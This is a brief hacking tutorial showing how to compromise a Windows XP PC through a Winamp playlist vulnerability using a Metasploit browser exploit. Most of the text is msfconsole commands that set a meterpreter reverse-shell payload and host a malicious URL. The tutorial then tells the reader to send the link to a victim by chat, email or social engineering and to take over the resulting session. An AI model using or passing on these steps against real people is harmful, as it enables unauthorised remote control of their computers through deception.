Hack Remote Windows PC using Winamp Media Player

This module exploits vulnerability in the Winamp media player. This flaw is triggered when a audio file path is specified, inside a playlist, that consists of a UNC path with a long computer name. This module delivers the playlist via the browser. This module has only been successfully tested on Winamp 5.11 and 5.12.
Winamp 5.12
Windows XP SP2
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/browser/winamp_playlist_unc
Msf exploit (winamp_playlist_unc)>set payload windows/meterpreter/reverse_tcp
Msf exploit (winamp_playlist_unc)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (winamp_playlist_unc)>set srvhost 192.168.1.2 (This must be an address on the local machine)
Msf exploit (winamp_playlist_unc)>set uripath winamp (The Url to use for this exploit)
Msf exploit (winamp_playlist_unc)>exploit

Now an URL you should give to your victim http://192.168.1.2:8080/winamp
 
Send the link of the server to the victim via chat or email or any social engineering technique.
Now you have access to the victims PC. Use “Sessions -l” and the Session number to connect to the session. And Now Type “sessions -i ID“
